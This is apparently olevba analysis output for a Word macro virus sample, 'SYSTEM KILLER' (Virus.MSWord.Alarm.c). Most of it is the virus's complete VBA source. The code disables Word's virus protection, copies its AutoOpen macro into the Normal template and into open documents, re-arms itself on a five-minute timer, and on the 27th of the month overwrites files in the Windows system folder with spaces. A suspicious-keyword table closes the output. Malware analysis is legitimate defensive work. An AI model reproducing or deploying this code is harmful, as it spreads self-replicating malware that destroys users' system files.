olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alarm.c-80bafb1229245484bd8c3e228f020cc0530f6337
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alarm.c-80bafb1229245484bd8c3e228f020cc0530f6337 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Alarm.c-80bafb1229245484bd8c3e228f020cc0530f6337 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The name is SYSTEM KILLER,Version 1.0

Public Sub MAIN()
Dim MyFile$
Dim x
Dim normal
Dim OkExist
Dim i
Dim TemplateName$
Dim active
Dim internal
Dim alarmtime
Dim alarm$

On Error GoTo PassErr

Word.Options.VirusProtection = False
If Day(Now()) = 27 Then OutBreak 'SYSTEM KILLER纪念日
'MsgBox Day(Now())

'如果未打开任何文档则运行bye2
If Application.Documents.Count = 0 Then GoTo Bye2

'设置文档模式
Dim dlg As Object
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)

'获取文件名，保存在MyFile$中
MyFile$ = WordBasic.[FileName$]()
If InStr(1, MyFile$, "文档") = 1 Then
    x = WordBasic.Dialog.FileSaveAs(dlg)
    MyFile$ = dlg.Name
Else
    WordBasic.CurValues.FileSaveAs dlg
    MyFile$ = dlg.Name
End If

'如果为宏文档则执行bye2
If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

'如果为新文档则执行bye1
If MyFile$ = "" Then GoTo Bye1

'以模板格式保存文件
If dlg.Format = 0 Then
    WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
Else
    WordBasic.FileSave
End If

'在Normal模板中寻找AutoOpen宏，找到则置OkExist=1，反之则置OkExist=0
normal = WordBasic.CountMacros(0)
OkExist = 0
For i = 1 To normal
    If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
Next i

'获取Normal模板的名称
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"

'把AutoOpen宏拷贝到Normal模板中
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
    'WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
End If

'在活动文档中寻找AutoOpen宏，找到则置OkExist=1，反之则置OkExist=0
active = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To active
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

'把AutoOpen宏拷贝到活动模板中
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
    WordBasic.FileSave
End If

'设置新文档模式
Bye1:
    dlg.Format = 0

'设置定时器以便再次运行AutoOpen宏
Bye2:
    internal = 5 / 24 / 60 ' internal time is 5 minutes系统时间5分钟
    alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
    alarm$ = WordBasic.[Time$](alarmtime)
    WordBasic.OnTime alarm$, "AutoOpen"

'如果出错则此次运行不再处理
PassErr:

End Sub

Private Sub OutBreak()
Const MyPath$ = "C:\WINDOWS\SYSTEM\" '指定路径
Const Sorry$ = "Sorry,"
Const MacroName$ = "SYSTEM KILLER V1.0使 "
Const InYour$ = " 中,"
Const Info$ = "个文件被破坏."

Dim MyName() As String
Dim i, j
Dim FileNumber As Integer
Dim PutSpace
Dim TotalWrite As Integer

i = 1
ReDim MyName(1000)
'找寻第一项
MyName(i) = Dir(MyPath, 2) '用2找到隐藏文件
'开始循环
Do While MyName(i) <> ""
    'MsgBox MyName(i)
    '解决文件属性问题
    If GetAttr(MyPath & MyName(i)) <> vbNormal Then SetAttr MyPath & MyName(i), vbNormal
    i = i + 1
    If i >= 500 Then ReDim Preserve MyName(UBound(MyName) + 100)
    '查找下一个
    MyName(i) = Dir(, 2)
Loop

FileNumber = 1
Total = 0
'开始改写过程
For j = 1 To i - 1
    On Error GoTo ErrNext
    Open MyPath & MyName(j) For Binary As #FileNumber
    '清文件为n...个...
    If LOF(FileNumber) < 5 Then PutSpace = 1 Else PutSpace = LOF(FileNumber) - 4 '小文件
    Put #FileNumber, 1, Space(PutSpace)
    TotalWrite = TotalWrite + 1
    Close #FileNumber
    FileNumber = FreeFile()
ErrNext:
Next j
    MsgBox Sorry & MacroName & MyPath & InYour & Str(TotalWrite) & Info

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

